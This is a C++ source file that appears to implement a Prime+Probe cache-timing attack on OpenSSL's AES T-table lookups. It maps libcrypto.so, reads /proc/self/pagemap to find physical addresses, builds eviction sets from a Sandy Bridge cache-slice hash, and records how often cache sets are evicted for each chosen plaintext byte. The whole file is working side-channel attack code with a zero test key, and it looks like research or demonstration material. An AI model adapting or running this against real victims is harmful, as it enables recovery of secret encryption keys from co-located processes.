#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <assert.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "../../cacheutils.h"
#include <map>
#include <vector>

// this number varies on different systems
#define MIN_CACHE_HIT_CYCLES (420)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (1000000)

uint8_t eviction[64*1024*1024];
uint8_t* eviction_ptr;

int pagemap = -1;

uint64_t GetPageFrameNumber(int pagemap, uint8_t* virtual_address) {
  // Read the entry in the pagemap.
  uint64_t value;
  int got = pread(pagemap, &value, 8,(((uintptr_t)virtual_address) / 0x1000) * 8);
  assert(got == 8);
  uint64_t page_frame_number = value & ((1ULL << 54)-1);
  return page_frame_number;
}

int get_cache_slice(uint64_t phys_addr, int bad_bit) {
 static const int h0[] = { 6, 10, 12, 14, 16, 17, 18, 20, 22, 24, 25, 26, 27, 28, 30, 32, 33, 35, 36 };
  static const int h1[] = { 7, 11, 13, 15, 17, 19, 20, 21, 22, 23, 24, 26, 28, 29, 31, 33, 34, 35, 37 };

  int count = sizeof(h0) / sizeof(h0[0]);
  int hash = 0;
  for (int i = 0; i < count; i++) {
    hash ^= (phys_addr >> h0[i]) & 1;
  }
  count = sizeof(h1) / sizeof(h1[0]);
  int hash1 = 0;
  for (int i = 0; i < count; i++) {
    hash1 ^= (phys_addr >> h1[i]) & 1;
  }
  return hash1 << 1 | hash;
}

__attribute__((aligned(4096))) int in_same_cache_set(uint64_t phys1, uint64_t phys2, int bad_bit) {
  // For Sandy Bridge, the bottom 17 bits determine the cache set
  // within the cache slice (or the location within a cache line).
  uint64_t mask = ((uint64_t) 1 << 17) - 1;
  return ((phys1 & mask) == (phys2 & mask) &&
          get_cache_slice(phys1, bad_bit) == get_cache_slice(phys2, bad_bit));
}

int g_pagemap_fd = -1;

// Extract the physical page number from a Linux /proc/PID/pagemap entry.
uint64_t frame_number_from_pagemap(uint64_t value) {
  return value & ((1ULL << 54) - 1);
}

void init_pagemap() {
  g_pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
  assert(g_pagemap_fd >= 0);
}

uint64_t get_physical_addr(uint64_t virtual_addr) {
  uint64_t value;
  off_t offset = (virtual_addr / 4096) * sizeof(value);
  int got = pread(g_pagemap_fd, &value, sizeof(value), offset);
  assert(got == 8);

  // Check the "page present" flag.
  assert(value & (1ULL << 63));

  uint64_t frame_num = frame_number_from_pagemap(value);
  return (frame_num * 4096) | (virtual_addr & (4095));
}

#define ADDR_COUNT 1024

volatile uint64_t* faddrs[16][ADDR_COUNT];
#define PROBE_COUNT 15

void pick(volatile uint64_t** addrs, int step)
{
  int found = 1;
  uint8_t* buf = (uint8_t*) addrs[0];
  uint64_t phys1 = get_physical_addr((uint64_t)buf);
  //printf("%zx -> %zx\n",(uint64_t) buf, phys1);
  for (size_t i = 0; i < 64*1024*1024-4096; i += 4096) {
    uint64_t phys2 = get_physical_addr((uint64_t)(eviction_ptr + i));
    if (phys1 != phys2 && in_same_cache_set(phys1, phys2, -1)) {
      addrs[found] = (uint64_t*)(eviction_ptr+i);
      //printf("%zx -> %zx\n",(uint64_t) eviction_ptr+i, phys2);
      //*(addrs[found-1]) = addrs[found];
      found++;
    }
  }
  fflush(stdout);
}


unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings;

char* base;
char* probe;
char* end;


void prime(volatile register size_t idx) // cached
{
  for (volatile register size_t i = 1; i < PROBE_COUNT+((idx == 11 || idx == 12)?-1:0); ++i)
  {
    *faddrs[idx][i];
    *faddrs[idx][i+1];
    *faddrs[idx][i+2];
    *faddrs[idx][i];
    *faddrs[idx][i+1];
    *faddrs[idx][i+2];
  }
}


int main()
{
  int fd = open("./libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);
  
  AES_encrypt(plaintext, ciphertext, &key_struct);
  
  for (size_t i = 0; i < 64*1024*1024; ++i)
    eviction[i] = i;

  for (probe = base + 0x16c940; probe < base + 0x16cd40; probe += 64) // 16    
    maccess(probe);

  printf("init pm\n");
  init_pagemap();

  for (probe = base + 0x16c940; probe < base + 0x16cd40; probe += 64) // 16    
  {
    faddrs[(size_t)(probe-base-0x16c940)/64][0] = (uint64_t*) probe;
  }

  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;
  for (size_t byte = 0; byte < 256; byte += 16)
  {
    plaintext[0] = byte;
    //plaintext[1] = byte;
    //plaintext[2] = byte;
    //plaintext[3] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    for (probe = base + 0x16c940; probe < base + 0x16cd40; probe += 64) // 16    
    {
      if (faddrs[(size_t)(probe-base-0x16c940)/64][1] == 0)
      {
    eviction_ptr = (uint8_t*)(((size_t)eviction & ~0xFFF) | ((size_t)faddrs[(size_t)(probe-base-0x16c940)/64][0] & 0xFFF));
        pick(faddrs[(probe-base-0x16c940)/64],1);
      }
      size_t count = 0;
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {
        sched_yield();
        for (size_t j = 1; j < 16; ++j)
          plaintext[j] = rand() % 256;
        AES_encrypt(plaintext, ciphertext, &key_struct);
        sched_yield();
        size_t time = rdtsc();
        prime(((size_t)(probe-base-0x16c940))/64);
        size_t delta = rdtsc() - time;
        if (delta >= MIN_CACHE_HIT_CYCLES)
          ++count;
      }
      timings[probe][byte] = count;
    }
  }

  for (auto ait : timings)
  {
    printf("%p", (void*) (ait.first - base));
    for (auto kit : ait.second)
    {
      printf(",%lu", kit.second);
    }
    printf("\n");
  }

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

